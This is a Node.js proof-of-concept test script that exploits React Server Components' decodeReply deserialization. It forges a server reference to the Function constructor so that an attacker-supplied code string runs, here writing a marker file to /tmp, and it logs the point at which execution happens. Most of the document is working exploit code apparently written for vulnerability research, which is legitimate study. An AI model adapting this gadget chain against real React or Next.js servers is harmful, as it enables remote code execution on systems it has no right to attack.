/**
 * Test: WHEN does RCE actually trigger?
 *
 * Question: Does code execute during decodeReply parsing,
 * or only when the returned function is called?
 */

'use strict';

// Setup
let webpackModuleIdx = 0;
const webpackServerModules = {};
const webpackServerMap = {};

global.__webpack_chunk_load__ = id => Promise.resolve();
global.__webpack_require__ = id => webpackServerModules[id];

const funcIdx = '' + webpackModuleIdx++;
webpackServerModules[funcIdx] = function action() { return 'legit'; };
const funcPath = 'file:///' + funcIdx;
webpackServerMap[funcPath + '#constructor'] = { id: funcIdx, chunks: [], name: 'constructor' };

process.env.NODE_ENV = 'production';
require.cache[require.resolve('react')] = {
  id: require.resolve('react'),
  filename: require.resolve('react'),
  loaded: true,
  exports: {
    __SERVER_INTERNALS_DO_NOT_USE_OR_WARN_USERS_THEY_CANNOT_UPGRADE: { H: null, A: null },
    version: '19.0.0',
  }
};

const { decodeReply } = require('react-server-dom-webpack/server.node');

async function test() {
  console.log('='.repeat(60));
  console.log('TEST: When does RCE trigger?');
  console.log('='.repeat(60));
  console.log('');

  // This code has a side effect - writes to a file
  const rceCode = `
    const fs = process.mainModule.require('fs');
    fs.writeFileSync('/tmp/rce-triggered.txt', 'RCE during decode: ' + new Date().toISOString());
    return 'CODE_EXECUTED';
  `;

  // Clean up any previous test
  try {
    require('fs').unlinkSync('/tmp/rce-triggered.txt');
  } catch (e) {}

  const formData = new Map();
  formData.set('1', JSON.stringify({
    id: funcPath + '#constructor',
    bound: '$@2'
  }));
  formData.set('2', JSON.stringify([rceCode]));
  formData.set('0', '"$F1"');
  formData.forEach = function(cb) {
    for (const [k, v] of this.entries()) cb(v, k);
  };

  console.log('[1] Before decodeReply...');
  console.log('    File exists?', require('fs').existsSync('/tmp/rce-triggered.txt'));

  const result = await decodeReply(formData, webpackServerMap);

  console.log('');
  console.log('[2] After decodeReply (before calling result)...');
  console.log('    Result type:', typeof result);
  console.log('    File exists?', require('fs').existsSync('/tmp/rce-triggered.txt'));

  console.log('');
  console.log('[3] Calling result() - this creates the function...');
  const createdFn = result();
  console.log('    Created fn type:', typeof createdFn);
  console.log('    File exists?', require('fs').existsSync('/tmp/rce-triggered.txt'));

  console.log('');
  console.log('[4] Calling createdFn() - this executes the body...');
  const output = createdFn();
  console.log('    Output:', output);
  console.log('    File exists?', require('fs').existsSync('/tmp/rce-triggered.txt'));

  if (require('fs').existsSync('/tmp/rce-triggered.txt')) {
    console.log('    File contents:', require('fs').readFileSync('/tmp/rce-triggered.txt', 'utf8'));
  }

  console.log('');
  console.log('='.repeat(60));
  console.log('CONCLUSION:');
  console.log('='.repeat(60));
  console.log('');
  console.log('RCE requires TWO calls after decodeReply:');
  console.log('  1. result()     -> Creates function from code string');
  console.log('  2. createdFn()  -> Executes the function body');
  console.log('');
  console.log('So the question is: Does Next.js ever call the');
  console.log('deserialized arguments in a way that triggers this?');
  console.log('');
}

test().catch(console.error);
